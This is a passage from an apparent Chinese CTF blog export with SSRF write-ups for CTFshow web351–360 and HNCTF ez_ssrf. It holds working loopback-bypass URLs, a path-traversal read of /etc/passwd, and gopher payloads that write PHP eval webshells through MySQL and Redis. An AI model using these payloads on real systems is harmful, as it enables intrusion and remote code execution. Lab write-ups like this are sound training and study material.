F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23PWD&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcatTOMCAT_SHA512&#x3D;9e6770e9c9c3b630011c0f0e320b31bb0ea3700d52247a12d544ea25f9ee4d93613ad6ccb7939f97fb05e1760978a7547eccb16352d73fa28886134ba58f3f8cTOMCAT_MAJOR&#x3D;8HOME&#x3D;&#x2F;rootLANG&#x3D;en_US.UTF-8TOMCAT_NATIVE_LIBDIR&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;native-jni-libFLAG&#x3D;flag{7r0m_jwt_t0_struts2}CATALINA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcatSHLVL&#x3D;0JDK_JAVA_OPTIONS&#x3D; –add-opens&#x3D;java.base&#x2F;java.lang&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.io&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.util&#x3D;ALL-UNNAMED –add-opens&#x3D;java.base&#x2F;java.util.concurrent&#x3D;ALL-UNNAMED –add-opens&#x3D;java.rmi&#x2F;sun.rmi.transport&#x3D;ALL-UNNAMEDLD_LIBRARY_PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;native-jni-libLC_ALL&#x3D;en_US.UTF-8PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;bin:&#x2F;opt&#x2F;java&#x2F;openjdk&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binTOMCAT_VERSION&#x3D;8.5.91JAVA_VERSION&#x3D;jdk8u372-b07</p>]]></content>
      
      
      
        <tags>
            
            <tag> unserialize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-CTFshow</title>
      <link href="/2023/07/22/SSRF%20%20web351-/"/>
      <url>/2023/07/22/SSRF%20%20web351-/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="SSRF-web351-web360"><a href="#SSRF-web351-web360" class="headerlink" title="SSRF  web351-web360"></a>SSRF  web351-web360</h1><p>写在前面：ssrf常见的一些函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl_init()：初始curl会话</span><br><span class="line">curl_setopt()：会话设置</span><br><span class="line">curl_close()：会话关闭</span><br><span class="line">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</span><br><span class="line">readfile()：输出一个文件的内容。</span><br><span class="line">fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</span><br><span class="line">curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</span><br><span class="line">fopen()：打开一个文件文件或者 URL。</span><br></pre></td></tr></table></figure><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><p>url&#x3D;<a href="http://127.1.0.1/flag.php">http://127.1.0.1/flag.php</a></p><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><p>url&#x3D;<a href="http://127.1.0.1/flag.php">http://127.1.0.1/flag.php</a></p><p>parse_url()解析请求包的参数，返回数组，scheme是请求包的协议</p><p>127.1会被解析成127.0.0.1，也就意味着为零可缺省<br>在Linux中，0也会被解析成127.0.0.1<br>127.0.0.0&#x2F;8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost<br>ip地址还可以通过表示成其他进制的形式访问，IP地址二进制、十进制、十六进制互换</p><h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><p>url&#x3D;<a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p><h2 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h2><p>这题限制了<code>http://[host]/[path]</code> host部分长度小于5</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>url&#x3D;<a href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p>host长度要小于3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure><p>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码使用了正则表达式来定义条件，具体条件如下：</p><ul><li><code>^</code>：表示匹配字符串的开始位置。</li><li><code>http://ctf\.</code>：表示以 “<a href="http://ctf/">http://ctf</a>.” 开头。其中，<code>.</code> 是正则表达式中的特殊字符，需要使用 <code>\</code> 进行转义。</li><li><code>.*</code>：表示匹配任意字符（除换行符外）的零个或多个实例。</li><li><code>show$</code>：表示以 “show” 结尾。</li><li><code>/i</code>：表示不区分大小写。</li></ul><p>综合起来，这个正则表达式的意思是判断给定的 URL 是否以 “<a href="http://ctf/">http://ctf</a>.” 开头，以 “show” 结尾，并且不区分大小写。</p><p>如果传入的 URL 满足上述条件，就会执行 <code>echo file_get_contents($url);</code> 的代码，使用 <code>file_get_contents()</code> 函数获取该 URL 的内容，并将其输出到页面上</p><p>想要做的输出flag.php无法作到在flag.PHP后面直接加show，加一个传参的形式即可</p><p>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a></p><h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p>用到工具<strong>利用gopher协议无密码注入mysql</strong>，使用<a href="https://github.com/tarunkant/Gopherus">Gopherus工具</a>构造payload</p><p>python gopherus.py  –exploit mysql</p><ul><li>选择构建mysql的payload</li><li>设置用户名，默认root</li><li>sql注入，写入shell，这里<strong>使用了into outfile新建shell并写入</strong></li><li>得到payload</li></ul><p>登陆界面找到一个隐藏的攻击点，对其进行SSRF攻击</p><p><img src="/2023/07/22/SSRF%20%20web351-/Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230711213538810.png"></p><p>将生成的gopher链接作为returl的参数，因为<code>_</code>后面的内容或经过两次url提交，所以需要再urlencode一次：（记得只编码下划线后面的，否则容易出错）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%20%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%61%5d%29%3b%3f%3e%27%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%27%3b%01%00%00%00%01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2520%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2561%255d%2529%253b%253f%253e%2527%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2561%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure><p> select ‘<?php eval($_POST[cmd]);?>‘into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;cmd.php’;</p><p><img src="/2023/07/22/SSRF%20%20web351-/Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230711213337033.png"></p><h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p>ssrf打Redis</p><p>写webshell</p><p>写ssh公钥</p><p>写contrab计划反弹shell</p><p>主从复制</p><p>这个题目上一题差不多，上一题打MySQL这一题打Redis</p><blockquote><p>什么是Redis未授权访问？</p><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器</p><p>简单说，漏洞的产生条件有以下两点：redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网<br>没有设置密码认证（一般为空），可以免密码远程登录redis服务</p></blockquote><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712182723167.png"></p><p>若出现报错，则说明存在redis服务</p><p>用工具做</p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712181653959.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>###其他绕过127的方法</p><p>1.如果目标代码限制访问的域名只能为 <a href="http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com">http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com</a> <a href="http://www.evil.com/">http://www.evil.com/</a></p><p>2.<a href="http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，如访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，如访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php</a> 像这样的网址还有 <a href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a></p><p>3.短网址目前基本都需要登录使用，如缩我，<a href="https://4m.cn/">https://4m.cn/</a></p><p>4.各种指向127.0.0.1的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/         # localhost就是代指127.0.0.1</span><br><span class="line">http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</span><br><span class="line">http://[::]:80/           # 在liunx下可用，window测试了下不行</span><br><span class="line">http://127。0。0。1/       # 用中文句号绕过</span><br><span class="line">http://①②⑦.⓪.⓪.①</span><br><span class="line">http://127.1/</span><br><span class="line">http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</span><br></pre></td></tr></table></figure><p>利用不存在的协议头绕过指定的协议头</p><p>file_get_contents()函数的一个特性，即当PHP的file_get_contents()函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// ssrf.php</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(!preg_match(&#x27;/^https/is&#x27;,$_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">die(&quot;no hack&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo file_get_contents($_GET[&#x27;url&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpsssss://</span><br></pre></td></tr></table></figure><p>此时file_get_contents()函数遇到了不认识的伪协议头“httpsssss:&#x2F;&#x2F;”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php?url=httpsssss://../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>###URL解析差异</p><p>1.readfile和parse_user函数解析差异绕过指定端口</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span>. <span class="variable">$_GET</span>[url];</span><br><span class="line"><span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$parsed</span>[port] == <span class="number">80</span> )&#123;  <span class="comment">// 这里限制了我们传过去的url只能是80端口的</span></span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssrf.php</span><br><span class="line">    </span><br><span class="line">    ?url=<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">11211</span>:<span class="number">80</span>/flag.txt</span><br></pre></td></tr></table></figure><p>可以成功读取11211端口flag.txt文件，原理如下图</p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190451055.png" alt="image-20230712190451055"></p><p>两个函数解析host也存在差异</p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/cc15c26e93dfaac450eaa31c71c8d40a.jpeg" alt="1610601347_5fffd383dfc1a3982425f.png!small?1610601348433"></p><p><strong>2.利用curl和parse_url的解析差异绕过指定host</strong></p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712190638172.png" alt="image-20230712190638172"></p><h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口</p><p>Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面</p><p>Gopher协议格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><p>注意不要忘记后面那个下划线”<em>“，下划线”</em>“后面才开始接TCP数据流，如果不加这个”_”，那么服务端收到的消息将不是完整的，该字符可随意写。</p><p>如果发起POST请求，回车换行需要使用%0d%0a来代替%0a，如果多个参数，参数之间的&amp;也需要进行URL编码</p><p>利用Gopher协议发送HTTP请求步骤</p><p>在gopher协议中发送HTTP的数据，需要以下三步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.抓取或构造HTTP数据包</span><br><span class="line">2.URL编码、将回车换行符%0a替换为%0d%0a</span><br><span class="line">3.发送符合gopher协议格式的请求</span><br></pre></td></tr></table></figure><p>注意这几个问题：</p><pre><code>问号（?）需要转码为URL编码，也就是%3f回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</code></pre><h1 id="HNCTF-2022-WEEK2-ez-ssrf"><a href="#HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf"></a>[HNCTF 2022 WEEK2]ez_ssrf</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这段代码接受通过 GET 请求传递的参数，并使用 <code>fsockopen()</code> 函数建立与指定主机和端口的 socket 连接。然后，它将传入的 base64 编码的数据解码，并将数据写入到连接的 socket 中。接下来，在循环中，它从连接中读取返回的响应数据，并将其输出到浏览器。</p><p>请注意，这段代码存在一些安全风险：</p><ol><li>没有对输入参数进行任何验证和过滤。这可能导致安全漏洞，如远程命令执行和代码注入攻击，请务必加以验证和过滤用户输入。</li><li>关闭 <code>error_reporting</code>，这会隐藏任何可能的错误信息，使得调试和错误处理变得困难，建议在开发和测试阶段启用错误报告以及适当的错误处理。</li></ol><p>建议对该代码进行改进和增强，以提高安全性和代码可靠性。</p><p>** <code>fsockopen()</code> 函数是用于建立一个 socket 连接。该函数的参数包括：</p><ul><li><code>$host</code>：要连接的主机名或 IP 地址。</li><li><code>intval($port)</code>：要连接的端口号，其中 <code>intval()</code> 函数将端口号转换为整数。</li><li><code>$error</code>：一个传入参数，用于获取错误代码（如果有错误发生）。</li><li><code>$errstr</code>：一个传入参数，用于获取错误描述信息（如果有错误发生）。</li><li><code>30</code>：超时时间，以秒为单位。****</li></ul><h3 id="题解"><a href="#题解" class="headerlink" 